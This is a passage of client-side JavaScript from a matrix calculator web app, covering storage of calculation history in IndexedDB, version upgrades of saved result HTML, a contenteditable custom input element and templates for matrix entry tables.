          if (y != null && (y.tagName.toLowerCase() === 'a' && y.classList.contains('question-icon') || y.tagName.toLowerCase() === 'span')) {
            var math = document.createElement('math');
            math.innerHTML = '<mpadded><mover accent="true">' + x.innerHTML + '<mtext></mtext></mover></mpadded>';
            var mtext = math.querySelector('mtext');
            while (x.nextElementSibling != null) {
              mtext.appendChild(x.nextElementSibling);
            }
            var qi = math.querySelector('.question-icon');
            if (qi != null) {
              qi.classList.toggle('question-icon', false);
              qi.classList.toggle('question-icon-new', true);
            }
            es[i].parentNode.insertBefore(math, es[i]);
            es[i].parentNode.removeChild(es[i]);
          }
        }
      }
    };
    var fixMencloseDraggable = function (tmp) {
      var es = tmp.querySelectorAll('menclose[draggable]');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        if (e.getAttribute('notation') === 'none') {
          var mrow = document.createElement('mrow');
          while (e.firstElementChild != null) {
            mrow.appendChild(e.firstElementChild);
          }
          var attributeNames = e.getAttributeNames();
          for (var j = 0; j < attributeNames.length; j += 1) {
            var a = attributeNames[j];
            mrow.setAttribute(a, e.getAttribute(a));
          }
          mrow.removeAttribute('notation');
          es[i].parentNode.insertBefore(mrow, e);
          es[i].parentNode.removeChild(e);
        }
      }
    };
    var fixMstyle = function (tmp) {
      var es = tmp.querySelectorAll('mstyle[mathvariant=bold]');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        var mrow = document.createElement('mrow');
        mrow.style.fontWeight = 'bold';
        while (e.firstElementChild != null) {
          mrow.appendChild(e.firstElementChild);
        }
        e.parentNode.insertBefore(mrow, e);
        e.parentNode.removeChild(e);
      }
    };
    var fixHTML = function (html) {
      if (html == undefined) {
        return html;
      }
      var tmp = document.createElement("div");
      html = fixMoMo(html);
      if (oldVersion <= 15) {
      html = fixDiagonalizeSteps(html);
      }
      tmp.innerHTML = html;
      try {
        fixOldDetailsTypes(tmp);
        if (oldVersion <= 15) {
          removeInsertButtons(tmp);
          fixMSUBAndMSUP(tmp);
          fixSummary(tmp);
          fixDetails(tmp);
          fixDetailsContainer(tmp);
          fixMatrixContainer(tmp);
          fixTable(tmp); // it should be before fixTop
          fixTop(tmp);
          fixDivMath(tmp);
          fixArrowWithLabel(tmp);
          fixMencloseInMenclose(tmp);
          removeCustomMath(tmp);
          removeMathClass(tmp);
          removeExtraMrows(tmp);
          addRowspacing(tmp);
          replaceMfenced(tmp);
          fixClassPivot(tmp);
        }
        if (oldVersion <= 16) {
          removeHref(tmp);
          removeMatrixMenuShowNew(tmp);
          removeDataX(tmp);
        }
        if (oldVersion <= 19) {
          fixMunder(tmp);
          fixRemoveSpanWrappers(tmp);
          fixQuestionIcon(tmp);
          if (tmp.querySelector('.question-icon') != null || tmp.querySelector('.relative') != null) {
            throw new TypeError('an issue with an update');
          }
        }
        if (oldVersion <= 20) {
          fixMencloseDraggable(tmp);
        }
        fixMstyle(tmp);
      } catch (error) {
        //TODO: fix
        console.error(error);
        window.setTimeout(function () {
          throw new TypeError("fixHTML(" + error.toString() + "): " + html);
        }, 0);
      }
      return tmp.innerHTML;
    };
    //if (data.expressionString != undefined && data.expressionString !== "") {
    //  RPNProxy.runExpression(data.expressionString, undefined, undefined, undefined, {idPrefix: "i" + data.actHistoryId}, function (result) {
    //    if (result.resultError == undefined) {
    //      data.resultHTML = result.resultHTML;
    //      data.detailsHTML = result.detailsHTML;
    //    }
    //  });
    //} else {
      data.resultHTML = fixHTML(data.resultHTML);
      data.detailsHTML = fixHTML(data.detailsHTML);
    //}
    if (data.detailsHTML == undefined) {
      var details = data.details;
      // details === null after JSON.parse(JSON.stringify(details))
      if (details != undefined && details.length !== 0) {
        hit({bc: "createDetailsSummary"});
        //TODO: async
        data.detailsHTML = RPNProxy.createDetailsSummary("i" + data.actHistoryId, details, details.length === 1 ? 100 : 1);
      }
    }
  }
  return data;
};

globalThis.ItemsStorage = ItemsStorage;

}());
/*global window, console*/

(function () {
"use strict";

function IDBItemsStorage(fallbackItemsStorage) {
  this.fallbackItemsStorage = fallbackItemsStorage;
}
IDBItemsStorage.prototype._ = function (operation, item, key, callback) {
  var fallbackItemsStorage = this.fallbackItemsStorage;
  var useFallback = function () {
    if (operation === "getAllEntries") {
      fallbackItemsStorage.getAllEntries(callback);
    }
    if (operation === "add") {
      fallbackItemsStorage.add(item, callback);
    }
    if (operation === "delete") {
      fallbackItemsStorage["delete"](key);
    }
    if (operation === "clear") {
      fallbackItemsStorage.clear();
    }
  };
  var roundValue = function (value, max) {
    return "10**" + (Math.floor(Math.log(Math.max(value, max) + 0.5) / Math.log(10)) + 1);
  };
  var length = function (value) {
    var n = 0;
    if (value == undefined) {
      n += 8;
    } else if (typeof value === "boolean") {
      n += 8;
    } else if (typeof value === "number") {
      n += 8;
    } else if (typeof value === "string") {
      n += 16 + value.length;
    } else if (typeof value === "object") {
      if (value instanceof Array) {
        for (var j = 0; j < value.length; j += 1) {
          n += length(value[j]);
        }
      } else {
        for (var i in value) {
          if (Object.prototype.hasOwnProperty.call(value, i)) {
            n += length(value[i]);
          }
        }
      }
    }
    return n;
  };
  var start = Date.now();
  var onEvent = function (operation, errorName, value) {
    var tmp = {};
    tmp[operation] = {ok: errorName, duration: roundValue(Date.now() - start, 100 - 1), valueLength: roundValue(length(value), 1000 - 1)};
    hit({idb: tmp});
  };
  var indexedDB = undefined;
  var wasError = false;
  try {
    indexedDB = window.indexedDB;
  } catch (error) {
    wasError = true;
    // "Cookies blocking in Firefox" - https://github.com/Modernizr/Modernizr/issues/1825#issuecomment-171087703
    onEvent("access", error.name, undefined);
    console.log(error);
    useFallback();
  }
  if (!wasError &&
      indexedDB != undefined) {
    var openRequest = undefined;
    try {
      openRequest = indexedDB.open("acthistory");
    } catch (error) {
      // "SecurityError" for opaque origins
      onEvent("access", error.name, undefined);
      console.log(error);
      useFallback();
    }
    if (openRequest != undefined) {
      openRequest.onupgradeneeded = function (event) {
        var db = event.target.result;
        if (db == null) {
          // Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.3.4-g
          window.onerror('TypeError: db is null, ' + (openRequest.result == null) + ' ' + (event.target === openRequest));//TODO: remove
          useFallback();
        }
        //! fallbackItemsStorage should be synchronous
        fallbackItemsStorage.getAllEntries(function (tmp) {
          var items = tmp.items;
          //Note: as the version was not provided, the object store should not exist at this point.
          var store = db.createObjectStore("items", {
            //keyPath: undefined, // IE 11 throws an InvalidAccessError for undefined or null
            autoIncrement: true
          });
          for (var i = 0; i < items.length; i += 1) {
            store.add(items[i]);
          }
        });
        //TODO: fallbackItemsStorage.clear()
      };
      //Note: this will handle abort of `openRequest.transaction` or an error during creation of a new database (step 5.1.6)
      openRequest.onerror = function (event) {
        onEvent("access", event.target.error != null ? event.target.error.name : null, undefined);
        console.log(event.target.error);
        useFallback();
        event.preventDefault();// FireFox 52 - 57
      };
      openRequest.onsuccess = function (event) {
        var db = event.target.result;
        var objectStoreNames = db.objectStoreNames;
        if (!objectStoreNames.contains("items")) {
          onEvent("access", "No store", undefined);
          console.log("No store");
          if (operation === "getAllEntries") {
            callback({keys: [], items: []});
          }
        } else {
          onEvent("access", "successful", undefined);
          // Note: it may throw a NotFoundError
          var transaction = db.transaction("items", operation === "getAllEntries" ? "readonly" : "readwrite");
          var store = transaction.objectStore("items");
          // Looks like "abort" is fired for QuotaExceededError
          transaction.onabort = function (event) {
            // TypeError: null is not an object (evaluating 'event.target.error.name') - https://matrixcalc.org/slu.html
            // Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
            onEvent(operation, event.target.error != null ? event.target.error.name : null, item);
            console.log(event.target.error); // Chrome shows nothing in the Console
            if (operation === "add" && event.target.error != null && event.target.error.name === "QuotaExceededError") {
              // delete some old records + repeat
              // `getAllKeys` is used to carefully work with multiple concurrent calls
              var transaction1 = db.transaction("items", "readonly");
              var store1 = transaction1.objectStore("items");
              var request1 = store1.getAllKeys();
              request1.onsuccess = function (event) {
                var keys = event.target.result;
                var n = keys.length;
                var slowAdd = function (divisor) {
                  var transaction2 = db.transaction("items", "readwrite");
                  var store2 = transaction2.objectStore("items");
                  transaction2.onabort = function (event) {
                    console.log(event.target.error); // Chrome shows nothing in the Console
                    if (event.target.error != null && event.target.error.name === "QuotaExceededError" && n >= divisor) {
                      slowAdd(divisor * 2);
                    } else {
                      db.close();
                    }
                  };
                  for (var i = 0; i < n - Math.floor(n / divisor); i += 1) {
                    store2["delete"](keys[i]);
                  }
                  var request3 = store2.add(item);
                  request3.onsuccess = function (event) {
                    var key = event.target.result;
                    transaction2.oncomplete = function (event) {
                      db.close();
                      callback(key);
                    };
                  };
                };
                transaction1.oncomplete = function (event) {
                  slowAdd(1);
                };
              };
              transaction1.onabort = function (event) {
                console.log(event.target.error); // Chrome shows nothing in the Console
                db.close();
              };
            } else {
              db.close();
              if (operation === "getAllEntries") {
                callback({keys: [], items: []});
              }
            }
          };
          if (operation === "getAllEntries") {
            var keysRequest = store.getAllKeys();
            keysRequest.onsuccess = function (event) {
              var keys = event.target.result;
              var valuesRequest = store.getAll();
              valuesRequest.onsuccess = function (event) {
                var items = event.target.result;
                transaction.oncomplete = function (event) {
                  onEvent(operation, "successful", {keys: keys, items: items});
                  db.close();
                  callback({keys: keys, items: items});
                };
              };
            };
          } else if (operation === "add") {
            var request = store.add(item);
            request.onsuccess = function (event) {
              var key = event.target.result;
              transaction.oncomplete = function (event) {
                onEvent(operation, "successful", item);
                db.close();
                callback(key);
              };
            };
          } else if (operation === "delete") {
            store["delete"](key);
            db.close();
          } else if (operation === "clear") {
            store.clear();
            db.close();
            if (fallbackItemsStorage != null) {
              fallbackItemsStorage.clear(); //TODO: remove
            }
          }
        }
      };
    }
  } else if (!wasError) {
    onEvent("access", "No indexedDB", undefined);
    console.log("No indexedDB");
    useFallback();
  }
};
IDBItemsStorage.prototype.getAllEntries = function (callback) {
  this._("getAllEntries", undefined, undefined, callback);
};
IDBItemsStorage.prototype.add = function (item, callback) {
  this._("add", item, undefined, callback);
};
IDBItemsStorage.prototype["delete"] = function (key) {
  this._("delete", undefined, key, undefined);
};
IDBItemsStorage.prototype.clear = function () {
  this._("clear", undefined, undefined, undefined);
};

globalThis.IDBItemsStorage = IDBItemsStorage;
}());

/*global RPN*/

(function () {
"use strict";

function RPNProxy() {
}

RPNProxy.getPositionInfo = function () {
  //TODO: async
  return RPN.getPositionInfo();
};
RPNProxy.toMathML = function (matrix, options) {
  //TODO: async
  var result = RPN.toMathML(matrix, options);
  return result;
};
RPNProxy.createDetailsSummary = function (idPrefix, details, bestMethodsLimit) {
  //TODO: async
  var result = RPN.createDetailsSummary(idPrefix, details, bestMethodsLimit);
  return result;
};
RPNProxy.getMatrix = function (string, callback, errorCallback) {
  try {
    var result = RPN.getMatrix(string);
    callback(result);
  } catch (error) {
    errorCallback(error);
  }
};
RPNProxy.getElementsArray = function (matrixTableState, callback) {
  var result = RPN.getElementsArray(matrixTableState);
  callback(result);
};
RPNProxy.checkExpressions = function (textareaValue, type, callback, errorCallback) {
  try {
    var result = RPN.checkExpressions(textareaValue, type);
    callback(result);
  } catch (error) {
    errorCallback(error);
  }
};
RPNProxy.checkExpression = function (input, callback, errorCallback) {
  try {
    var result = RPN.checkExpression(input);
    callback(result);
  } catch (error) {
    errorCallback(error);
  }
};
RPNProxy.runExpression = function (input, kInputValue, kInputId, matrixTableStates, printOptions, callback) {
  var result = RPN.runExpression(input, kInputValue, kInputId, matrixTableStates, printOptions);
  callback(result);
};
RPNProxy.getDetails = function (data, printOptions, callback) {
  var result = RPN.getDetails(data, printOptions);
  callback(result);
};

globalThis.RPNProxy = RPNProxy;
}());

/*global ItemsStorage */

(function () {
"use strict";

function ActHistoryItem(data, idIfNotSet) {
  var oldVersion = data.version || 0;
  if (oldVersion < ActHistoryItem.version) {
    data = ItemsStorage.updateItem(data, idIfNotSet);
  }
  this.oldVersion = oldVersion;
  this.resultHTML = data.resultHTML || "";
  this.resultMatrix = data.resultMatrix || "";
  this.details = data.details;
  this.expressionString = data.expressionString;
  this.actHistoryId = data.actHistoryId;
  this.detailsHTML = data.detailsHTML;
  this.version = ActHistoryItem.version;
}

ActHistoryItem.version = 22;

function ActHistoryStorage(itemsStorage) {
  this.itemsStorage = itemsStorage;
  this.actHistory = {};
  this.actHistoryId = 0;
}
ActHistoryStorage.prototype.load = function (callback) {
  this.itemsStorage.getAllEntries(function (tmp) {
    var keys = tmp.keys;
    var items = tmp.items;
    this.actHistory = {};
    for (var i = 0; i < items.length; i += 1) {
      var key = keys[i];
      var item = items[i];
      if (item != null && item.version < ActHistoryItem.version) {
        item = ItemsStorage.updateItem(item);
      }
      this.actHistory[key] = {item: item, key: key};
      this.actHistoryId = Math.max(this.actHistoryId, key);
    }
    callback(this.actHistory);
  }.bind(this));
};
ActHistoryStorage.prototype.getPreviousItem = function () {
  var previousItem = undefined;
  for (var i in this.actHistory) {
    if (Object.prototype.hasOwnProperty.call(this.actHistory, i)) { // TODO: iteration order - ?
      if (this.actHistory[i] != undefined) {
        previousItem = this.actHistory[i].item;
      }
    }
  }
  return previousItem;
};
ActHistoryStorage.prototype.size = function () {
  var size = 0;
  for (var i in this.actHistory) {
    if (Object.prototype.hasOwnProperty.call(this.actHistory, i)) {
      if (this.actHistory[i] != undefined) {
        size += 1;
      }
    }
  }
  return size;
};
ActHistoryStorage.prototype.getItem = function (actHistoryId) {
  var x = this.actHistory[actHistoryId];
  return x == undefined ? undefined : x.item;
};
ActHistoryStorage.prototype.setItem = function (actHistoryId, item) {
  this.actHistory[actHistoryId] = {item: item, key: undefined};
  this.itemsStorage.add(item, function (key) {
    this.actHistoryId = Math.max(this.actHistoryId, key);
    if (this.actHistory[actHistoryId] != undefined) {
      this.actHistory[actHistoryId] = {item: item, key: key};
    } else {
      this.itemsStorage["delete"](key);
    }
  }.bind(this));
};
ActHistoryStorage.prototype.removeItem = function (actHistoryId) {
  var key = this.actHistory[actHistoryId].key;
  if (key != undefined) {
    this.itemsStorage["delete"](key);
  }
  delete this.actHistory[actHistoryId];
};
ActHistoryStorage.prototype.clear = function () {
  this.itemsStorage.clear();
  this.actHistory = {};
};

ActHistoryStorage.prototype._getActHistory = function () {
  return Object.assign({}, this.actHistory);
};

globalThis.ActHistoryItem = ActHistoryItem;
globalThis.ActHistoryStorage = ActHistoryStorage; //!

}());

'use strict';

// 1. polyfill beforeinput event

// Chrome does not support 'onbeforeinput' in document.documentElement
if (!('onbeforeinput' in document.documentElement) && !(typeof InputEvent !== 'undefined' && 'getTargetRanges' in InputEvent.prototype)) {
  var makeEvent = function (inputType, dataTransfer) {
    var e = new Event('beforeinput', {bubbles: true, cancelable: true});
    e.inputType = inputType;//TODO: fix
    e.dataTransfer = dataTransfer;//TODO: fix
    return e;
  };
  // listen events on window to allow document listeners to prevent them (!)
  window.addEventListener('drop', function (event) {
    if (!event.defaultPrevented && !event.target.dispatchEvent(makeEvent('insertFromDrop', event.dataTransfer))) {
      event.preventDefault();
    }
  }, false);
  window.addEventListener('paste', function (event) {
    if (!event.defaultPrevented && !event.target.dispatchEvent(makeEvent('insertFromPaste', event.clipboardData))) {
      event.preventDefault();
    }
  }, false);
  window.addEventListener('keydown', function (event) {
    if (!event.defaultPrevented) {
      var DOM_VK_RETURN = 13;
      if (event.keyCode === DOM_VK_RETURN && !event.ctrlKey && !event.metaKey && !event.altKey) {
        if (!event.target.dispatchEvent(makeEvent(event.shiftKey ? 'insertLineBreak' : 'insertParagraph', null))) {
          event.preventDefault();
        }
      }
      if ((event.ctrlKey || event.metaKey) && !event.shiftKey && !event.altKey) {
        var inputType = null;
        if (event.keyCode === 'B'.charCodeAt(0)) {
          inputType = 'formatBold';
        }
        if (event.keyCode === 'I'.charCodeAt(0)) {
          inputType = 'formatItalic';
        }
        if (event.keyCode === 'U'.charCodeAt(0)) {
          inputType = 'formatUnderline';
        }
        if (inputType != null) {
          if (!event.target.dispatchEvent(makeEvent(inputType, null))) {
            event.preventDefault();
          }
        }
      }
    }
  }, false);
}

if (window.customElements != null) { // IE 8 does not support getters/setters on non-DOM objects
(function () {

  // https://bugzilla.mozilla.org/show_bug.cgi?id=1291467
  // Use beforeinput event to implement contenteditable="plaintext-only":
  document.addEventListener('beforeinput', function (event) {
    var inputType = event.inputType;
    if (inputType !== 'insertText') {
      if (event.target.tagName.toLowerCase() === 'custom-input') {
        //console.log(event);
        if (inputType === 'insertParagraph' || inputType === 'insertLineBreak') { // Enter or Shift+Enter
          if (event.target.getAttribute('aria-multiline') !== 'true') {
            event.preventDefault();
          }
        } else if (inputType === 'insertFromPaste' || inputType === 'insertFromDrop' || inputType === 'insertReplacementText') {
          event.preventDefault();
          var insertion = event.data || event.dataTransfer.getData('text/plain');
          if (event.target.getAttribute('aria-multiline') !== 'true') {
            insertion = insertion.replace(/[\r\n]/g, '');
          }
          //var targetRanges = event.getTargetRanges();
          document.execCommand('insertText', false, insertion);
        } else if (inputType === 'formatBold' || inputType === 'formatItalic' || inputType === 'formatUnderline') { // Ctrl+B, Ctrl+I, Ctrl+U
          event.preventDefault();
        } else if (inputType === 'historyUndo' ||
                   inputType === 'historyRedo' ||
                   inputType === 'deleteByCut' ||
                   inputType === 'deleteByDrag' ||
                   inputType === 'deleteContentBackward' ||
                   inputType === 'deleteContentForward' ||
                   inputType === 'deleteWordBackward' ||
                   inputType === 'deleteWordForward') {
          // do nothing
        } else if (inputType === 'insertText' ||
                   inputType === 'insertCompositionText') {
          var insertion = event.data;
          if (event.target.getAttribute('aria-multiline') !== 'true' && /[\r\n]/.test(event.data)) {
            event.preventDefault();
            insertion = insertion.replace(/[\r\n]/g, '');
            document.execCommand('insertText', false, insertion);
          }
        } else {
          throw new TypeError('unexpected inputType: ' + inputType);
        }
      }
    }
  }, false);

  function isAfter(container, offset, node) {
    var c = node;
    while (c.parentNode != container) {
      c = c.parentNode;
    }
    var i = offset;
    while (c != null && i > 0) {
      c = c.previousSibling;
      i -= 1;
    }
    return i > 0;
  }
  function compareCaretPositons(node1, offset1, node2, offset2) {
    if (node1 === node2) {
      return offset1 - offset2;
    }
    var c = node1.compareDocumentPosition(node2);
    if ((c & Node.DOCUMENT_POSITION_CONTAINED_BY) !== 0) {
      return isAfter(node1, offset1, node2) ? +1 : -1;
    } else if ((c & Node.DOCUMENT_POSITION_CONTAINS) !== 0) {
      return isAfter(node2, offset2, node1) ? -1 : +1;
    } else if ((c & Node.DOCUMENT_POSITION_FOLLOWING) !== 0) {
      return -1;
    } else if ((c & Node.DOCUMENT_POSITION_PRECEDING) !== 0) {
      return +1;
    }
  }

  function stringifyElementStart(node, isLineStart) {
    if (node.tagName.toLowerCase() === 'br') {
      if (true) {
        return '\n';
      }
    }
    if (node.tagName.toLowerCase() === 'div') { // Is a block-level element?
      if (!isLineStart) { //TODO: Is not at start of a line?
        return '\n';
      }
    }
    return '';
  }
  function positions(node, isLineStart) {
    isLineStart = isLineStart == undefined ? true : isLineStart;
    console.assert(node.nodeType === Node.ELEMENT_NODE);
    var child = node.firstChild;
    var offset = 0;
    var state = 0;
    var i = null;
    var x = null;
    return {
      next: function () {
        while (i != null) {
          x = i.next();
          if (!x.done) {
            return {value: x.value, done: false};
          }
          i = null;
          isLineStart = x.value;
        }
        if (state === 0) {
          state = 1;
          return {value: {node: node, offset: offset, text: stringifyElementStart(node, isLineStart)}, done: false};
        }
        while (child != null) {
          if (state === 1) {
            if (child.nodeType === Node.TEXT_NODE) {
              isLineStart = false;
              state = 2;
              return {value: {node: child, offset: 0/0, text: child.data}, done: false};
            } else {
              state = 2;
              i = positions(child, isLineStart);
              x = i.next();
              if (!x.done) {
                return {value: x.value, done: false};
              }
              isLineStart = x.value;
              i = null;
            }
          }
          if (state === 2) {
            offset += 1;
            state = 3;
            return {value: {node: node, offset: offset, text: ''}, done: false};
          }
          child = child.nextSibling;
          console.assert(state === 3);
          state = 1;
        }
        return {value: isLineStart, done: true};
      }
    };
  }
  function getCaretPosition(contenteditable, textPosition) {
    var textOffset = 0;
    var lastNode = null;
    var lastOffset = 0;
    for (var i = positions(contenteditable), x = i.next(); !x.done; x = i.next()) {
      var p = x.value;
      if (p.text.length > textPosition - textOffset) {
        return {node: p.node, offset: p.node.nodeType === Node.TEXT_NODE ? textPosition - textOffset : p.offset};
      }
      textOffset += p.text.length;
      lastNode = p.node;
      lastOffset = p.node.nodeType === Node.TEXT_NODE ? p.text.length : p.offset;
    }
    return {node: lastNode, offset: lastOffset};
  }
  function getTextOffset(contenteditable, selectionNode, selectionOffset) {
    var textOffset = 0;
    for (var i = positions(contenteditable), x = i.next(); !x.done; x = i.next()) {
      var p = x.value;
      if (selectionNode.nodeType !== Node.TEXT_NODE && selectionNode === p.node && selectionOffset === p.offset) {
        return textOffset;
      }
      if (selectionNode.nodeType === Node.TEXT_NODE && selectionNode === p.node) {
        return textOffset + selectionOffset;
      }
      textOffset += p.text.length;
    }
    return compareCaretPositons(selectionNode, selectionOffset, contenteditable, 0) < 0 ? 0 : textOffset;
  }
  function getValue(contenteditable) {
    var value = '';
    for (var i = positions(contenteditable), x = i.next(); !x.done; x = i.next()) {
      var p = x.value;
      value += p.text;
    }
    return value;
  }
  function setSelectionRange(contenteditable, start, end) {
    var selection = window.getSelection();
    var s = getCaretPosition(contenteditable, start);
    var e = getCaretPosition(contenteditable, end);
    selection.setBaseAndExtent(s.node, s.offset, e.node, e.offset);
  }
  //TODO: Ctrl+A - rangeCount is 2
  function getSelectionDirection(contenteditable) {
    var selection = window.getSelection();
    var c = compareCaretPositons(selection.anchorNode, selection.anchorOffset, selection.focusNode, selection.focusOffset);
    return c < 0 ? 'forward' : 'none';
  }
  function getSelectionStart(contenteditable) {
    var selection = window.getSelection();
    var c = compareCaretPositons(selection.anchorNode, selection.anchorOffset, selection.focusNode, selection.focusOffset);
    return c < 0 ? getTextOffset(contenteditable, selection.anchorNode, selection.anchorOffset) : getTextOffset(contenteditable, selection.focusNode, selection.focusOffset);
  }
  function getSelectionEnd(contenteditable) {
    var selection = window.getSelection();
    var c = compareCaretPositons(selection.anchorNode, selection.anchorOffset, selection.focusNode, selection.focusOffset);
    return c < 0 ? getTextOffset(contenteditable, selection.focusNode, selection.focusOffset) : getTextOffset(contenteditable, selection.anchorNode, selection.anchorOffset);
  }

  function CustomInput() {
    return Reflect.construct(HTMLElement, [], CustomInput);
  }
  CustomInput.prototype = Object.create(HTMLElement.prototype);

  //class CustomInput extends HTMLElement {
  //  constructor() {
      // Always call super first in constructor
  //    super();
  //  }
  //}
  CustomInput.prototype.connectedCallback = function () {
    this.appendChild(document.createTextNode(''));
    this.setAttribute('role', 'textbox');
    this.tabIndex = 0; // to support spatial navigation polyfill
    this.setAttribute('contenteditable', 'true');

    var mo = new MutationObserver(function () {
      if (!this.hasChildNodes()) {
        // Firefox bug: https://stackoverflow.com/questions/16984287/why-text-align-right-doesnt-work-on-empty-contenteditable-element-in-firefox/16984412#16984412
        this.appendChild(document.createTextNode(''));
      }
      if (this.childElementCount !== 0) {
        var html = this.innerHTML;
        window.setTimeout(function () {
          throw new TypeError('element child: ' + html);
        }, 0);
      }
    }.bind(this));
    mo.observe(this, {childList: true, characterData: true, subtree: false});
  };
  CustomInput.prototype.select = function () {
    //setSelectionRange(this, 0, 1/0); - "insertText" is not working in Firefox
    window.getSelection().selectAllChildren(this);
  };
  CustomInput.prototype.setSelectionRange = function (start, end) {
    setSelectionRange(this, start, end);
  };
  CustomInput.prototype.setRangeText = function (text) {// call only in fallback cases
    this.value = this.value.slice(0, this.selectionStart) + text + this.value.slice(this.selectionEnd);
  };
  Object.defineProperty(CustomInput.prototype, 'value', {
    get: function () {
      return getValue(this);
    },
    set: function (value) {
      //throw new TypeError('CustomInput#value is not settable, use document.execCommand("insertText", false, value) instead');
      //TODO: multiline: <br /> or \n - ?
      //TODO: remove - ?
      while (this.firstElementChild != null) {
        this.firstElementChild.remove();
      }
      this.firstChild.textContent = value;
      while (this.firstChild.nextSibling != null) {
        this.firstChild.nextSibling.remove();
      }
    }
  });
  Object.defineProperty(CustomInput.prototype, 'selectionDirection', {
    get: function () {
      return getSelectionDirection(this);
    }
  });
  Object.defineProperty(CustomInput.prototype, 'selectionStart', {
    get: function () {
      return getSelectionStart(this);
    }
  });
  Object.defineProperty(CustomInput.prototype, 'selectionEnd', {
    get: function () {
      return getSelectionEnd(this);
    }
  });
  Object.defineProperty(CustomInput.prototype, 'placeholder', {
    get: function () {
      return this.getAttribute('aria-placeholder');
    },
    set: function (value) {
      this.setAttribute('aria-placeholder', value);
    }
  });

  if (window.customElements != null) {
    //TODO: older Firefox versions (?)
    window.customElements.define('custom-input', CustomInput);
  }
  
  CustomInput.testables = {
    getValue: getValue,
    getSelectionEnd: getSelectionEnd,
    getSelectionStart: getSelectionStart
  };
  window.CustomInput = CustomInput;

}());
}

/*jshint esversion:6*/

(function () {
  "use strict";

// tabindex="0" - remove tabindex, as it does not work well with spatial navigation
var INSERT_TABLE_TEMPLATE = '' +
  '<div data-for="NAME" tabindex="-1" class="matrix-table-inner" dir="ltr">' +
  '  <div class="table-container">' +
  '    <math>' +
  '      <mrow>' +
  '        <mo>(</mo>' +
  '        <mpadded height="+0.250em" voffset="+0.125em">' +
  '          <mtable rowspacing="0ex" columnspacing="0em" columnalign="left">' +
  '          </mtable>' +
  '        </mpadded>' +
  '        <mo>)</mo>' +
  '      </mrow>' +
  '    </math>' +
  '  </div>' +
  '  <div class="textarea-container">' +
  '    <math>' +
  '      <mrow>' +
  '        <mo>(</mo>' +
  '        <mpadded height="+0.250em" voffset="+0.125em">' +
  '          <mi>' +
  '            <span class="a-input">' +
  '              <textarea id="TEXTAREA_NAME" name="TEXTAREA_NAME" wrap="off" autocapitalize="off" autocomplete="off" spellcheck="false" class="matrix-table-textarea unfocused-placeholder" placeholder=""></textarea>' +
  '            </span>' +
  '          </mi>' +
  '        </mpadded>' +
  '        <mo>)</mo>' +
  '      </mrow>' +
  '    </math>' +
  '  </div>' +
  '</div>' +
  '<div>' +
  '  <button type="button" aria-pressed="mixed" class="swap-mode-button"></button>' +
  '  <button type="button" aria-pressed="mixed" class="numbers-only-mode-button">âŒ¨</button>' +
  '  <button type="button" class="upload-image"><span>ðŸ“·ï¸Ž</span></button>' +
  '  <input type="file" name="upload" accept="image/*" hidden />' +
  '  <button type="button" class="undo-button" disabled hidden>â†¶</button>' +
  '  <button type="button" class="redo-button" disabled hidden>â†·</button>' +
  '  <button type="button" class="clear-table-button"><span>ðŸ§¹ï¸Ž</span></button>' +
  '  <span class="div-nowrap">' +
  '    <button type="button" class="increment-size-button resize-table-button" data-increment="+1">+</button>' +
  '    <button type="button" class="decrement-size-button resize-table-button" data-increment="-1">&minus;</button>' +
  '  </span>' +
  '</div>';

var insertTableTemplate = document.createElement('div');
insertTableTemplate.innerHTML = INSERT_TABLE_TEMPLATE.trim().replace(/>\s+</g, '><');


var inputTemplate = document.createElement("div");
var prepareInputTemplate = function () {
  var isInsertTextWorking = function () {
    var activeElement = document.activeElement;
    var input = document.createElement('input');
    input.style.position = 'fixed'; // prevent scrolling - ?
    input.style.top = '0';
    input.style.left = '0';
    document.body.appendChild(input);
    input.focus({preventScroll: true});
    var result = document.queryCommandEnabled('insertText');
    input.parentNode.removeChild(input);
    activeElement.focus({preventScroll: true});
    return result;
  };
  //! autocomplete:
  //! "off" does not allow to use the bfcache, but helps with an input from mobiles
  // <table> ?
  //var inputTitle = "element " + (i + 1).toString() + ", " + (j + 1).toString();

  // no way to input negative numbers on some android devices with inputmode="numeric" or inputmode="decimal"
  // https://bugs.webkit.org/show_bug.cgi?id=197916 - numeric becomes useless in iOS 13
  var userAgent = window.navigator.userAgent;
  var inputMode = /android/i.test(userAgent) || !/OS\s+12/.test(userAgent) ? '' : 'numeric';

  var pattern = '[\\p{Decimal_Number}\\p{Punctuation}\\p{Math}\\p{Script=Latin}\\p{Script=Greek}\\p{Other_Number}]+'; // "contextual information" to determine which type of virtual keyboard should be presented to the user
  //console.assert(new RegExp('^(?:' + pattern + ')$', 'u').test("â…‡^(â…ˆâ‹…Ï€)+1=x") === true);

  // https://github.com/whatwg/html/issues/3478
  // https://github.com/whatwg/html/issues/4589

  //! Notes:
  //! extra spans - to fix an issue in Firefox with an extra height
  //! lang="" affects monospace font selection
  var INPUT_TEMPLATE = ('<span class="matrix-table-cell">' +
                          '  <span>' +
                          '    <span class="a-input">' +
                          '      <input type="text" id="id" name="name" autocapitalize="off" autocomplete="off" ' +
                          '             spellcheck="false" inputmode="${inputMode}" class="matrix-table-input unfocused-placeholder" ' +
                          '             data-for="for" data-row="-1" data-column="-1" enterkeyhint="enter" placeholder="0" ' +
                          '             pattern="${pattern}" />' +
                          '    </span>' +
                          '  </span>' +
                          '</span>').trim().replace(/>\s+</g, '><')
                                    .replace(/a\-input/, !('activeElement' in document) ? '' : 'a-input') // Firefox 2
                                    .replace(/\$\{inputMode\}/g, inputMode)
                                    .replace(/\$\{pattern\}/g, pattern);
  //var isFirefox = /firefox/i.test(window.navigator.userAgent);//TODO: fix
  //TODO: check in Firefox 89 - insertText should work, but is global undo stack needed? + the issus with placeholder (resets the undo stack) - there is a workaround
  var isFirefox = !isInsertTextWorking() || HTMLInputElement.prototype.mozIsTextField != null;//!
  inputTemplate.innerHTML = (isFirefox && window.customElements != null ? INPUT_TEMPLATE.replace(/<input ([^>]+) \/>/g, '<custom-input $1></custom-input>') : INPUT_TEMPLATE);
};
prepareInputTemplate();

